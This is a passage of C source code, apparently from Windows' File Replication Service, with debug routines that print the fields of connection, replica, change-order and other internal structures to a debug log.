    Debsub      - for DPRINTs
    uLineNo     - for DPRINTs

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "FrsPrintTypeCxtion:"
    WCHAR   TabW[MAX_TAB_WCHARS + 1];
    CHAR    Guid[GUID_CHAR_LEN + 1];
    CHAR    TimeStr[TIME_STRING_LENGTH];
    CHAR    FlagBuffer[120];

    if (!Cxtion) {
        return;
    }

    //
    // Prettyprint indentation
    //
    InfoTabs(Tabs, TabW);

    if (!Info) {
        DebLock();
    }


    try {

        ITPRINT0("\n");
        ITPRINTGNAME(Cxtion->Name,    "%ws   Cxtion: %ws (%s)\n");
        ITPRINTGNAME(Cxtion->Partner, "%ws      Partner      : %ws (%s)\n");
        ITPRINT2("%ws      PartDnsName  : %ws\n", TabW, Cxtion->PartnerDnsName);
        ITPRINT2("%ws      PartSrvName  : %ws\n", TabW, Cxtion->PartSrvName);
        ITPRINT2("%ws      PartPrincName: %ws\n", TabW, Cxtion->PartnerPrincName);
        ITPRINT2("%ws      PartSid      : %ws\n", TabW, Cxtion->PartnerSid);
        ITPRINTGUID(&Cxtion->ReplicaVersionGuid, "%ws      OrigGuid     : %s\n");
        ITPRINT2("%ws      State        : %d\n", TabW, GetCxtionState(Cxtion));

        FrsFlagsToStr(Cxtion->Flags, CxtionFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
        ITPRINT3("%ws      Flags        : %08x Flags [%s]\n", TabW, Cxtion->Flags, FlagBuffer);

        FrsFlagsToStr(Cxtion->Options, CxtionOptionsFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
        ITPRINT3("%ws      CxtionOptions: %08x Flags [%s]\n", TabW, Cxtion->Options, FlagBuffer);

        ITPRINT2("%ws      Inbound      : %s\n", TabW, (Cxtion->Inbound) ? "TRUE" : "FALSE");
        ITPRINT2("%ws      JrnlCxtion   : %s\n", TabW, (Cxtion->JrnlCxtion) ? "TRUE" : "FALSE");
        ITPRINT2("%ws      PartnerAuth  : %d\n", TabW, Cxtion->PartnerAuthLevel);
        ITPRINT2("%ws      TermCoSn     : %d\n", TabW, Cxtion->TerminationCoSeqNum);
        ITPRINT2("%ws      JoinCmd      : 0x%08x\n", TabW, Cxtion->JoinCmd);
        ITPRINT2("%ws      CoCount      : %d\n", TabW, Cxtion->ChangeOrderCount);
        ITPRINT2("%ws      CommQueue    : %d\n", TabW, Cxtion->CommQueueIndex);
        ITPRINT2("%ws      CoPQ         : %08x\n", TabW, Cxtion->CoProcessQueue);
        ITPRINT2("%ws      UnjoinTrigger: %d\n", TabW, Cxtion->UnjoinTrigger);
        ITPRINT2("%ws      UnjoinReset  : %d\n", TabW, Cxtion->UnjoinReset);
        ITPRINT2("%ws      Comm Packets : %d\n", TabW, Cxtion->CommPkts);
        ITPRINT2("%ws      PartnerMajor : %d\n", TabW, Cxtion->PartnerMajor);
        ITPRINT2("%ws      PartnerMinor : %d\n", TabW, Cxtion->PartnerMinor);
        //
        // Don't print the join guid in the logs; they may be readable
        // by anyone. An Info-RPC is secure so return the join guid in
        // case it is needed for debugging.
        //
        if (Info) {
            ITPRINTGUID(&Cxtion->JoinGuid, "%ws      JoinGuid     : %s\n");
            FileTimeToString((PFILETIME) &Cxtion->LastJoinTime, TimeStr);
            ITPRINT2("%ws      LastJoinTime : %s\n" , TabW, TimeStr);
        }

        if (Cxtion->Schedule) {
            ITPRINT1("%ws      Schedule\n", TabW);
            FrsPrintTypeSchedule(Severity, Info, Tabs + 3, Cxtion->Schedule, Debsub, uLineNo);
        }

        if (Cxtion->VVector) {
            ITPRINT1("%ws      Version Vector\n", TabW);
        }

    } finally {
        //
        // If the above took an exception make sure we drop the lock.
        //
        if (!Info) {
            DebUnLock();
        }
    }

    if (Cxtion->VVector) {
        FrsPrintTypeVv(Severity, Info, Tabs + 3, Cxtion->VVector, Debsub, uLineNo);
    }

    if (Cxtion->OLCtx) {
        if (!Info) {
            DebLock();
        }

        try {
            ITPRINT1("%ws      OutLog Partner\n", TabW);
            ITPRINT2("%ws      BytesSent    : %d\n", TabW, PM_READ_CTR_CXTION(Cxtion,FetBSentBytes));
        } finally {
            //
            // If the above took an exception make sure we drop the lock.
            //
            if (!Info) {
                DebUnLock();
            }
        }
        FrsPrintTypeOutLogPartner(Severity, Info, Tabs + 3, Cxtion->OLCtx,
                                  -1, "FrsPrintType", Debsub, uLineNo);
    }
}


VOID
FrsPrintTypeCxtions(
    IN ULONG            Severity,   OPTIONAL
    IN PNTFRSAPI_INFO   Info,       OPTIONAL
    IN DWORD            Tabs,       OPTIONAL
    IN PGEN_TABLE       Cxtions,
    IN PCHAR            Debsub,     OPTIONAL
    IN ULONG            uLineNo     OPTIONAL
    )
/*++
Routine Description:
    Print a table of cxtions

Arguments:
    Severity    - for DPRINTs
    Info        - RPC output buffer
    Tabs        - prettyprint
    Cxtions     - Cxtion table
    Debsub      - for DPRINTs
    uLineNo     - for DPRINTs

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB  "FrsPrintTypeCxtions:"
    PVOID   Key;
    PCXTION Cxtion;
    WCHAR   TabW[MAX_TAB_WCHARS + 1];
    CHAR    Guid[GUID_CHAR_LEN + 1];

    if (!Cxtions) {
        return;
    }

    //
    // Prettyprint indentation
    //
    InfoTabs(Tabs, TabW);

    Key = NULL;
    while (Cxtion = GTabNextDatum(Cxtions, &Key)) {
        FrsPrintTypeCxtion(Severity, Info, Tabs, Cxtion, Debsub, uLineNo);
    }
}


VOID
FrsPrintTypeReplica(
    IN ULONG            Severity,   OPTIONAL
    IN PNTFRSAPI_INFO   Info,       OPTIONAL
    IN DWORD            Tabs,       OPTIONAL
    IN PREPLICA         Replica,
    IN PCHAR            Debsub,     OPTIONAL
    IN ULONG            uLineNo     OPTIONAL
    )
/*++

Routine Description:

    Print a replica and its cxtions.

Arguments:

    Severity -- Severity level for print.  (See debug.c, debug.h)

    Info - Text buffer

    Tabs - Prettyprint prepense

    Replica - Replica struct

    Debsub -- Name of calling subroutine.

    uLineno -- Line number of caller

MACRO:  FRS_PRINT_TYPE

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "FrsPrintTypeReplica:"
    CHAR  Guid[GUID_CHAR_LEN + 1];
    WCHAR TabW[MAX_TAB_WCHARS + 1];
    CHAR  FlagBuffer[120];

    if (!Replica) {
        return;
    }

    InfoTabs(Tabs, TabW);

    if (!Info) {DebLock();}

    try {

        ITPRINTGNAME(Replica->SetName,            "%ws   Replica: %ws (%s)\n");
        ITPRINT2("%ws      ComputerName : %ws\n", TabW, ((ComputerName != NULL) ? ComputerName : L"null"));
        ITPRINTGNAME(Replica->MemberName,         "%ws      Member      : %ws (%s)\n");
        ITPRINTGNAME(Replica->ReplicaName,        "%ws      Name        : %ws (%s)\n");

        ITPRINTGUID(Replica->ReplicaRootGuid,     "%ws      RootGuid    : %s\n");
        ITPRINTGUID(&Replica->ReplicaVersionGuid, "%ws      OrigGuid    : %s\n");

        ITPRINT2("%ws      Reference     : %d\n", TabW, Replica->ReferenceCount);

        FrsFlagsToStr(Replica->CnfFlags, ConfigFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
        ITPRINT3("%ws      CnfFlags      : %08x Flags [%s]\n", TabW,
                 Replica->CnfFlags, FlagBuffer);

        FrsFlagsToStr(Replica->FrsRsoFlags, FrsRsoFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
        ITPRINT3("%ws      RepSetObjFlags: %08x Flags [%s]\n", TabW,
                 Replica->FrsRsoFlags, FlagBuffer);

        ITPRINT2("%ws      SetType       : %d\n", TabW, Replica->ReplicaSetType);
        ITPRINT2("%ws      Consistent    : %d\n", TabW, Replica->Consistent);
        ITPRINT2("%ws      IsOpen        : %d\n", TabW, Replica->IsOpen);
        ITPRINT2("%ws      IsJournaling  : %d\n", TabW, Replica->IsJournaling);
        ITPRINT2("%ws      IsAccepting   : %d\n", TabW, Replica->IsAccepting);
        ITPRINT2("%ws      IsSeeding     : %d\n", TabW, Replica->IsSeeding);
        ITPRINT2("%ws      NeedsUpdate   : %d\n", TabW, Replica->NeedsUpdate);

        ITPRINT3("%ws      ServiceState  : %d  (%s)\n", TabW,
                 Replica->ServiceState, RSS_NAME(Replica->ServiceState));

        ITPRINT2("%ws      FStatus       : %s\n", TabW, ErrLabelFrs(Replica->FStatus));
        ITPRINT2("%ws      Number        : %d\n", TabW, Replica->ReplicaNumber);
        ITPRINT2("%ws      Root          : %ws\n", TabW, Replica->Root);
        ITPRINT2("%ws      Stage         : %ws\n", TabW, Replica->Stage);
        ITPRINT2("%ws      Volume        : %ws\n", TabW, Replica->Volume);
        ITPRINT2("%ws      FileFilter    : %ws\n", TabW, Replica->FileFilterList);
        ITPRINT2("%ws      DirFilter     : %ws\n", TabW, Replica->DirFilterList);
        ITPRINT2("%ws      Expires       : %08x %08x\n", TabW,
                PRINTQUAD(Replica->MembershipExpires));
        ITPRINT2("%ws      InLogRetry    : %d\n", TabW, Replica->InLogRetryCount);
        ITPRINT2("%ws      InLogSeq      : %d\n", TabW, Replica->InLogSeqNumber);
        ITPRINT2("%ws      ApiState      : %d\n", TabW, Replica->NtFrsApi_ServiceState);
        ITPRINT2("%ws      ApiStatus     : %d\n", TabW, Replica->NtFrsApi_ServiceWStatus);
        ITPRINT2("%ws      ApiHack       : %d\n", TabW, Replica->NtFrsApi_HackCount);
        ITPRINT2("%ws      OutLogSeq     : %d\n", TabW, Replica->OutLogSeqNumber);
        ITPRINT2("%ws      OutLogJLx     : %d\n", TabW, Replica->OutLogJLx);
        ITPRINT2("%ws      OutLogJTx     : %d\n", TabW, Replica->OutLogJTx);
        ITPRINT2("%ws      OutLogMax     : %d\n", TabW, Replica->OutLogCOMax);
        ITPRINT2("%ws      OutLogMin     : %d\n", TabW, Replica->OutLogCOMin);
        ITPRINT2("%ws      OutLogState   : %d\n", TabW, Replica->OutLogWorkState);
        ITPRINT2("%ws      OutLogVV's    : %d\n", TabW, Replica->OutLogCountVVJoins);
        ITPRINT2("%ws      OutLogClean   : %d\n", TabW, Replica->OutLogDoCleanup);

        ITPRINT2("%ws      PreinstallFID : %08x %08x\n", TabW,
                PRINTQUAD(Replica->PreInstallFid));

        ITPRINT2("%ws      InLogCommit   : %08x %08x\n", TabW,
                PRINTQUAD(Replica->InlogCommitUsn));

        ITPRINT2("%ws      JrnlStart     : %08x %08x\n", TabW,
                PRINTQUAD(Replica->JrnlRecoveryStart));

        ITPRINT2("%ws      JrnlEnd       : %08x %08x\n", TabW,
                PRINTQUAD(Replica->JrnlRecoveryEnd));

        ITPRINT2("%ws      LastUsn       : %08x %08x\n", TabW,
                PRINTQUAD(Replica->LastUsnRecordProcessed));

        if (Replica->Schedule) {
            ITPRINT1("%ws      Schedule\n", TabW);
            FrsPrintTypeSchedule(Severity, Info, Tabs + 3,  Replica->Schedule, Debsub, uLineNo);
        }

        if (Replica->VVector) {
            ITPRINT1("%ws      Replica Version Vector\n", TabW);
        }

    } finally {
        //
        // If the above took an exception make sure we drop the lock.
        //
        if (!Info) {DebUnLock();}
    }


    FrsPrintTypeVv(Severity, Info, Tabs + 3, Replica->VVector, Debsub, uLineNo);

    if (!Info) {DebLock();}

    try {
        ITPRINT1("%ws      Outlog Version Vector\n", TabW);
    } finally {
        if (!Info) {DebUnLock();}
    }

    FrsPrintTypeVv(Severity, Info, Tabs + 3, Replica->OutlogVVector, Debsub, uLineNo);

    FrsPrintTypeCxtions(Severity, Info, Tabs + 1, Replica->Cxtions, Debsub, uLineNo);

}


VOID
FrsPrintType(
    IN ULONG Severity,
    IN PVOID Node,
    IN PCHAR Debsub,
    IN ULONG uLineNo
    )
/*++

Routine Description:

    This routine prints out the contents of a given node,
    performing any node specific interpretation.

Arguments:

    Severity -- Severity level for print.  (See debug.c, debug.h)

    Node - The address of the node to print.

    Debsub -- Name of calling subroutine.

    uLineno -- Line number of caller

MACRO:  FRS_PRINT_TYPE

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "FrsPrintType:"

    ULONG                 NodeSize;
    ULONG                 NodeType;
    ULONG                 Marker;
    PREPLICA              Replica;
    PREPLICA_THREAD_CTX   RtCtx;
    PTABLE_CTX            TableCtx;
    PTHREAD_CTX           ThreadCtx;
    ULONG                 i;
    PVOLUME_MONITOR_ENTRY pVme;
    PFILTER_TABLE_ENTRY   FilterEntry;
    PQHASH_TABLE          QhashTable;
    PLIST_ENTRY           Entry;
    PCXTION               Cxtion;
    SYSTEMTIME            ST;
    PWILDCARD_FILTER_ENTRY WildcardEntry;
    POUT_LOG_PARTNER      Olp;
    PCONFIG_NODE          ConfigNode;
    PULONG                pULong;
    BOOL                  HaveLock;


    PCHANGE_ORDER_ENTRY   CoEntry;
    PCHANGE_ORDER_COMMAND CoCmd;
    CHAR                  GuidStr[GUID_CHAR_LEN];
    CHAR                  TimeStr[TIME_STRING_LENGTH];
    CHAR                  FlagBuffer[160];


    if (!DoDebug(Severity, Debsub)) {
        return;
    }
    //
    // Get debug lock so our output stays in one piece.
    //
    DebLock();
    HaveLock = TRUE;

    try {

        if (Node != NULL) {
            NodeType = (ULONG) (((PFRS_NODE_HEADER) Node)->Type);
            NodeSize = (ULONG) (((PFRS_NODE_HEADER) Node)->Size);
            FRS_DEB_PRINT("Display for Node: ...%s...   ===   ===   ===   ===\n",
                           NodeTypeNames[NodeType]);
        } else {
            FRS_DEB_PRINT("Display for Node: ...<null>...   ===   ===   ===   ===\n\n",
                           NULL);
            __leave;
        }


        switch (NodeType) {
        //
        // Print a Thread Context struct
        //
        case THREAD_CONTEXT_TYPE:
            if (NodeSize != sizeof(THREAD_CTX)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for THREAD_CONTEXT\n",
                               NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            ThreadCtx = (PTHREAD_CTX) Node;

            break;

        //
        // Print a Replica struct
        //
        case REPLICA_TYPE:
            if (NodeSize != sizeof(REPLICA)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for REPLICA\n", NodeSize);
                break;
            }
            DebUnLock();
            HaveLock = FALSE;
            FrsPrintTypeReplica(Severity, NULL, 0, (PREPLICA) Node, Debsub, uLineNo);
            DebLock();
            HaveLock = TRUE;
            break;

        //
        // Print a Replica Thread Context struct
        //
        case REPLICA_THREAD_TYPE:
            if (NodeSize != sizeof(REPLICA_THREAD_CTX)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for REPLICA_THREAD_CTX\n",
                               NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            RtCtx = (PREPLICA_THREAD_CTX) Node;

            //
            // Get the base of the array of TableCtx structs from the replica thread
            // context struct.
            //
            TableCtx = RtCtx->RtCtxTables;

            //
            // Release the memory for each table context struct.
            //
            //for (i=0; i<TABLE_TYPE_MAX; ++i, ++TableCtx) {
            //}


            break;

        //
        // Print a topology node
        //
        case CONFIG_NODE_TYPE:
            if (NodeSize != sizeof(CONFIG_NODE)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for CONFIG_NODE\n",
                              NodeSize);
                break;
            }
            ConfigNode = Node;
            FRS_DEB_PRINT("CONFIG NODE Address %08x\n", ConfigNode);

            FrsPrintGNameForNode(Severity, ConfigNode->Name, L"\t", L"Node",
                                 Debsub, uLineNo);

            FrsPrintGNameForNode(Severity, ConfigNode->PartnerName, L"\t", L"Partner",
                                 Debsub, uLineNo);

            FRS_DEB_PRINT("\tDsObjectType    %ws\n", DsConfigTypeName[ConfigNode->DsObjectType]);
            FRS_DEB_PRINT("\tConsistent      %s\n", (ConfigNode->Consistent) ? "TRUE" : "FALSE");
            FRS_DEB_PRINT("\tInbound         %s\n", (ConfigNode->Inbound) ? "TRUE" : "FALSE");
            FRS_DEB_PRINT("\tThisComputer    %s\n", (ConfigNode->ThisComputer) ? "TRUE" : "FALSE");
            FRS_DEB_PRINT("\tUsnChanged      %ws\n", ConfigNode->UsnChanged);
            FRS_DEB_PRINT("\tDn              %ws\n", ConfigNode->Dn);
            FRS_DEB_PRINT("\tPrincName       %ws\n", ConfigNode->PrincName);
            FRS_DEB_PRINT("\tDnsName         %ws\n", ConfigNode->DnsName);
            FRS_DEB_PRINT("\tPartnerDnsName  %ws\n", ConfigNode->PartnerDnsName);
            FRS_DEB_PRINT("\tSid             %ws\n", ConfigNode->Sid);
            FRS_DEB_PRINT("\tPartnerSid      %ws\n", ConfigNode->PartnerSid);
            FRS_DEB_PRINT("\tPartnerDn       %ws\n", ConfigNode->PartnerDn);
            FRS_DEB_PRINT("\tPartnerCoDn     %ws\n", ConfigNode->PartnerCoDn);
            FRS_DEB_PRINT("\tSettingsDn      %ws\n", ConfigNode->SettingsDn);
            FRS_DEB_PRINT("\tComputerDn      %ws\n", ConfigNode->ComputerDn);
            FRS_DEB_PRINT("\tMemberDn        %ws\n", ConfigNode->MemberDn);
            FRS_DEB_PRINT("\tSetType         %ws\n", ConfigNode->SetType);
            FRS_DEB_PRINT("\tRoot            %ws\n", ConfigNode->Root);
            FRS_DEB_PRINT("\tStage           %ws\n", ConfigNode->Stage);
            FRS_DEB_PRINT("\tWorking         %ws\n", ConfigNode->Working);
            FRS_DEB_PRINT("\tFileFilterList  %ws\n", ConfigNode->FileFilterList);
            FRS_DEB_PRINT("\tDirFilterList   %ws\n", ConfigNode->DirFilterList);
            FRS_DEB_PRINT("\tSchedule        %08x\n",ConfigNode->Schedule);
            FRS_DEB_PRINT("\tScheduleLength  %d\n",  ConfigNode->ScheduleLength);
            FRS_DEB_PRINT("\tUsnChanged      %ws\n", ConfigNode->UsnChanged);
            FRS_DEB_PRINT("\tSameSite        %s\n", (ConfigNode->SameSite) ? "TRUE" : "FALSE");
            FRS_DEB_PRINT("\tEnabledCxtion   %ws\n", ConfigNode->EnabledCxtion);
            FRS_DEB_PRINT("\tVerifiedOverlap %s\n", (ConfigNode->VerifiedOverlap) ? "TRUE" : "FALSE");
            break;

        //
        // Print a connection
        //
        case CXTION_TYPE:
            if (NodeSize != sizeof(CXTION)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for CXTION\n",
                              NodeSize);
                break;
            }
            DebUnLock();
            HaveLock = FALSE;
            FrsPrintTypeCxtion(Severity, NULL, 0, (PCXTION)Node, Debsub, uLineNo);
            DebLock();
            HaveLock = TRUE;
            break;

        //
        // Print a guid/rpc handle
        //
        case GHANDLE_TYPE:
            if (NodeSize != sizeof(GHANDLE)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for GHANDLE\n",
                              NodeSize);
                break;
            }

            GuidToStr(&(((PGHANDLE)Node)->Guid), GuidStr);
            FRS_DEB_PRINT2("Address %08x, Cxtion Guid : %s\n", Node, GuidStr);

            break;

        //
        // Print a generic table
        //
        case GEN_TABLE_TYPE:
            if (NodeSize != sizeof(GEN_TABLE)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for GEN_TABLE\n",
                              NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            break;

        //
        // Print a generic thread context
        //
        case THREAD_TYPE:
            if (NodeSize != sizeof(FRS_THREAD)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for FRS_THREAD\n",
                               NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            break;

        //
        // Print a journal read buffer.
        //
        case JBUFFER_TYPE:
            if (NodeSize != SizeOfJournalBuffer) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for JBUFFER\n",
                              NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            break;

        //
        // Print a journal volume monitor entry.
        //
        case VOLUME_MONITOR_ENTRY_TYPE:
            if (NodeSize != sizeof(VOLUME_MONITOR_ENTRY)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for VOLUME_MONITOR_ENTRY\n",
                              NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            pVme = (PVOLUME_MONITOR_ENTRY) Node;




            break;


        //
        // Print a command packet.
        //
        case COMMAND_PACKET_TYPE:
            if (NodeSize != sizeof(COMMAND_PACKET)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for COMMAND_PACKET\n",
                              NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n",  Node);
            break;

        //
        // Print a generic hash table struct.
        //
        case GENERIC_HASH_TABLE_TYPE:
            if (NodeSize != sizeof(GENERIC_HASH_TABLE)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for GENERIC_HASH_TABLE\n",
                              NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);
            break;

    
        //
        // Print a Change Order Entry struct.
        //
        case CHANGE_ORDER_ENTRY_TYPE:
            if (NodeSize != sizeof(CHANGE_ORDER_ENTRY)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for CHANGE_ORDER_ENTRY\n",
                              NodeSize);
                break;
            }

            CoEntry = (PCHANGE_ORDER_ENTRY)Node;
            CoCmd = &CoEntry->Cmd;

            GuidToStr(&CoCmd->ChangeOrderGuid, GuidStr);
            FRS_DEB_PRINT3("Address %08x  ***%s CO*** - %s\n",
                           CoEntry,
                           (CO_FLAG_ON(CoEntry, CO_FLAG_LOCALCO)) ? "LOCAL" : "REMOTE",
                           GuidStr);

            FRS_DEB_PRINT3("Node Addr: %08x,  HashValue: %08x  RC: %d\n",
                           CoEntry,
                           CoEntry->HashEntryHeader.HashValue,
                           CoEntry->HashEntryHeader.ReferenceCount);

            FRS_DEB_PRINT2("List Entry - %08x,  %08x\n",
                           CoEntry->HashEntryHeader.ListEntry.Flink,
                           CoEntry->HashEntryHeader.ListEntry.Blink);


            FRS_DEB_PRINT2("FileRef: %08lx %08lx, ParentRef: %08lx %08lx\n",
                           PRINTQUAD(CoEntry->FileReferenceNumber),
                           PRINTQUAD(CoEntry->ParentFileReferenceNumber));

            FRS_DEB_PRINT("\n", NULL);
            FRS_DEB_PRINT("STATE: %s\n", PRINT_CO_STATE(CoEntry));

            FrsFlagsToStr(CoEntry->EntryFlags, CoeFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_DEB_PRINT2("EntryFlags: %08x, Flags [%s]\n", CoEntry->EntryFlags, FlagBuffer);

            FrsFlagsToStr(CoEntry->IssueCleanup, IscuFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_DEB_PRINT2("ISCU Flags: %08x, Flags [%s]\n", CoEntry->IssueCleanup, FlagBuffer);

            FRS_DEB_PRINT("\n", NULL);

            GuidToStr(&CoCmd->OriginatorGuid, GuidStr);
            FRS_DEB_PRINT("OrigGuid  : %s\n", GuidStr);

            GuidToStr(&CoCmd->FileGuid, GuidStr);
            FRS_DEB_PRINT("FileGuid  : %s\n", GuidStr);

            GuidToStr(&CoCmd->OldParentGuid, GuidStr);
            FRS_DEB_PRINT("OParGuid  : %s\n",GuidStr);

            GuidToStr(&CoCmd->NewParentGuid, GuidStr);
            FRS_DEB_PRINT("NParGuid  : %s\n", GuidStr);

            GuidToStr(&CoCmd->CxtionGuid, GuidStr);
            FRS_DEB_PRINT2("CxtionGuid: %s  (%08x)\n", GuidStr, CoEntry->Cxtion);

            FileTimeToString((PFILETIME) &CoCmd->AckVersion, TimeStr);
            FRS_DEB_PRINT("AckVersion: %s\n", TimeStr);

            FRS_DEB_PRINT("\n", NULL);

            FRS_DEB_PRINT2("FileName: %ws, Length: %d\n", CoEntry->UFileName.Buffer,
                           CoCmd->FileNameLength);

            FrsFlagsToStr(CoCmd->ContentCmd, UsnReasonNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_DEB_PRINT2("ContentCmd: %08x, Flags [%s]\n", CoCmd->ContentCmd, FlagBuffer);

            FRS_DEB_PRINT("\n", NULL);

            FrsFlagsToStr(CoCmd->Flags, CoFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_DEB_PRINT2("CoFlags: %08x, Flags [%s]\n", CoCmd->Flags, FlagBuffer);

            FrsFlagsToStr(CoCmd->IFlags, CoIFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            DebPrintNoLock(Severity, TRUE,
                           "IFlags: %08x, Flags [%s]  TimeToRun: %7d,  EntryCreateTime: %7d\n",
                           Debsub, uLineNo,
                           CoCmd->IFlags, FlagBuffer,
                           CoEntry->TimeToRun,
                           CoEntry->EntryCreateTime);

            DebPrintNoLock(Severity, TRUE,
                           "LocationCmd: %s (%d), CO STATE:  %s   File/Dir: %d\n",
                           Debsub, uLineNo,
                           CoLocationNames[GET_CO_LOCATION_CMD(CoEntry->Cmd, Command)],
                           GET_CO_LOCATION_CMD(CoEntry->Cmd, Command),
                           PRINT_CO_STATE(CoEntry),
                           GET_CO_LOCATION_CMD(CoEntry->Cmd, DirOrFile));

            FRS_DEB_PRINT("\n", NULL);
            FRS_DEB_PRINT2("OriginalParentFid: %08lx %08lx, NewParentFid: %08lx %08lx\n",
                           PRINTQUAD(CoEntry->OriginalParentFid),
                           PRINTQUAD(CoEntry->NewParentFid));

            DebPrintNoLock(Severity, TRUE,
                           "OriginalReplica: %ws (%d), NewReplica: %ws (%d)\n",
                           Debsub, uLineNo,
                           CoEntry->OriginalReplica->ReplicaName->Name,
                           CoCmd->OriginalReplicaNum,
                           CoEntry->NewReplica->ReplicaName->Name,
                           CoCmd->NewReplicaNum);

            if (CoCmd->Extension != NULL) {
                pULong = (PULONG) CoCmd->Extension;
                DebPrintNoLock(Severity, TRUE,
                           "CO Extension: (%08x) %08x %08x %08x %08x %08x %08x %08x %08x\n",
                           Debsub, uLineNo, pULong,
                           *(pULong+0), *(pULong+1), *(pULong+2), *(pULong+3),
                           *(pULong+4), *(pULong+5), *(pULong+6), *(pULong+7));
            } else {
                FRS_DEB_PRINT("CO Extension: Null\n", NULL);
            }

            FRS_DEB_PRINT("\n", NULL);
            FRS_DEB_PRINT3("File Attributes: %08x, SeqNum: %08x, FileSize: %08x %08x\n",
                           CoCmd->FileAttributes,
                           CoCmd->SequenceNumber,
                           PRINTQUAD(CoCmd->FileSize));

            FRS_DEB_PRINT("FrsVsn: %08x %08x\n", PRINTQUAD(CoCmd->FrsVsn));

            FRS_DEB_PRINT3("Usn:    %08x %08x   CoFileUsn: %08x %08x   JrnlFirstUsn: %08x %08x\n",
                           PRINTQUAD(CoCmd->JrnlUsn),
                           PRINTQUAD(CoCmd->FileUsn),
                           PRINTQUAD(CoCmd->JrnlFirstUsn));


            FRS_DEB_PRINT("Version: %08x   ", CoCmd->FileVersionNumber);

            FileTimeToString((PFILETIME) &CoCmd->EventTime.QuadPart, TimeStr);
            DebPrintNoLock(Severity, FALSE, "EventTime: %s\n", Debsub, uLineNo, TimeStr);

            break;
    
        //
        // Print a Filter Table Entry struct.
        //
        case FILTER_TABLE_ENTRY_TYPE:
            if (NodeSize != sizeof(FILTER_TABLE_ENTRY)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for FILTER_TABLE_ENTRY\n",
                              NodeSize);
                break;
            }
            FRS_DEB_PRINT("Address %08x\n", Node);

            FilterEntry = (PFILTER_TABLE_ENTRY)Node;

            break;

        //
        // Print a QHASH table struct.
        //
        case QHASH_TABLE_TYPE:

            QhashTable = (PQHASH_TABLE)Node;
            if (NodeSize != QhashTable->BaseAllocSize) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for QHASH_TABLE\n",
                              NodeSize);
                break;
            }

            FRS_DEB_PRINT("Table Address      : %08x\n", QhashTable);
            FRS_DEB_PRINT("BaseAllocSize      : %8d\n",  QhashTable->BaseAllocSize);
            FRS_DEB_PRINT("ExtensionAllocSize : %8d\n",  QhashTable->ExtensionAllocSize);
            FRS_DEB_PRINT("ExtensionListHead  : %08x\n", QhashTable->ExtensionListHead);
            FRS_DEB_PRINT("FreeList           : %08x\n", QhashTable->FreeList);
            FRS_DEB_PRINT("Lock               : %08x\n", QhashTable->Lock);
            FRS_DEB_PRINT("HeapHandle         : %08x\n", QhashTable->HeapHandle);
            FRS_DEB_PRINT("HashCalc           : %08x\n", QhashTable->HashCalc);
            FRS_DEB_PRINT("NumberEntries      : %8d\n",  QhashTable->NumberEntries);
            FRS_DEB_PRINT("HashRowBase        : %08x\n", QhashTable->HashRowBase);

            break;

        //
        // Print an Output Log Partner struct.
        //
        case OUT_LOG_PARTNER_TYPE:
            if (NodeSize != sizeof(OUT_LOG_PARTNER)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for OUT_LOG_PARTNER\n",
                              NodeSize);
                break;
            }
            DebUnLock();
            HaveLock = FALSE;
            FrsPrintTypeOutLogPartner(Severity, NULL, 0, (POUT_LOG_PARTNER)Node,
                                      -1, "FrsPrintType", Debsub, uLineNo);
            DebLock();
            HaveLock = TRUE;
            break;


        //
        // Print a Wildcard file filter Entry struct.
        //
        case WILDCARD_FILTER_ENTRY_TYPE:
            if (NodeSize != sizeof(WILDCARD_FILTER_ENTRY)) {
                FRS_DEB_PRINT("FrsPrintType - Bad node size %d for WILDCARD_FILTER_ENTRY\n",
                               NodeSize);
                break;
            }
            FRS_DEB_PRINT( "Address %08x\n", Node);

            WildcardEntry = (PWILDCARD_FILTER_ENTRY)Node;


            DebPrintNoLock(Severity, TRUE,
                           "Flags: %08x,  Wildcard FileName: %ws, Length: %d\n",
                           Debsub, uLineNo,
                           WildcardEntry->Flags,
                           WildcardEntry->UFileName.Buffer,
                           (ULONG)WildcardEntry->UFileName.Length);
            break;


        //
        // Invalid Node Type
        //
        default:
            Node = NULL;
            DebPrintNoLock(0, TRUE,
                           "Internal error - invalid node type - %d\n",
                           Debsub, uLineNo, NodeType);
        }


        FRS_DEB_PRINT("-----------------------\n", NULL);

    } finally {
        //
